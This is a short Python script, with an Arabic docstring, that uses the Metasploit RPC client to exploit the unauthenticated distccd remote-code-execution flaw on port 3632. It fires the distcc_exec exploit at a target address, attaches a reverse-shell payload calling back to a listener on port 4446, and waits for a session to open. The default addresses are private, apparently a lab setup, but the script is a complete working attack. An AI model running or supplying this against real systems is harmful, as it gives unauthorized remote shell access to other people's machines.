"""فحص حي لثغرة distccd (منفذ 3632) -- RCE بدون مصادقة."""
from pymetasploit3.msfrpc import MsfRpcClient
import time, os, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.187.144"
LHOST = sys.argv[2] if len(sys.argv) > 2 else "192.168.187.137"
pw = os.environ.get("MSF_RPC_PASS", "")
if not pw:
    sys.exit("export MSF_RPC_PASS اولاً")

c = MsfRpcClient(pw, server="127.0.0.1", port=55552, ssl=False)
mod = c.modules.use("exploit", "unix/misc/distcc_exec")
mod["RHOSTS"] = TARGET
payload = c.modules.use("payload", "cmd/unix/reverse")
payload["LHOST"] = LHOST
payload["LPORT"] = 4446

before = set(c.sessions.list.keys())
r = mod.execute(payload=payload)
print("Execute result:", r)
for i in range(15):
    time.sleep(3)
    sess = set(c.sessions.list.keys()) - before
    if sess:
        print("SESSION OPENED:", sess)
        break
    print(f"  waiting... {i*3}s")
else:
    print("NO SESSION after 45s")
